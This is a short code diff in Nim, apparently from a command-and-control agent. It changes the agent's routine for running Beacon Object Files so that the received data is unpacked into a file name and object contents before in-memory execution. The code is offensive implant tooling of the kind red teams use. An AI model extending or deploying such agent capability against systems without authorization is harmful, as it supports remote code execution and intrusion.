@@ -27,7 +27,7 @@ when defined(agent):
     import osproc, strutils, strformat
     import ../agent/core/coff
     import ../agent/protocol/result
-    import ../common/utils
+    import ../common/[utils, serialize]
     
     proc executeBof(ctx: AgentCtx, task: Task): TaskResult = 
         try: 
@@ -46,8 +46,14 @@ when defined(agent):
                 # Combine the passed arguments into a format that is understood by the Beacon API
                 arguments = generateCoffArguments(task.args[1..^1])
             
-            echo fmt"   [>] Executing object file."
-            let output = inlineExecuteGetOutput(objectFile, arguments)
+            # Unpacking object file, since it contains the file name too.
+            var unpacker = Unpacker.init(Bytes.toString(objectFile))
+            let 
+                fileName = unpacker.getDataWithLengthPrefix()
+                objectFileContents = unpacker.getDataWithLengthPrefix()
+
+            echo fmt"   [>] Executing object file {fileName}."
+            let output = inlineExecuteGetOutput(string.toBytes(objectFileContents), arguments)
 
             if output != "":
                 return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(output))
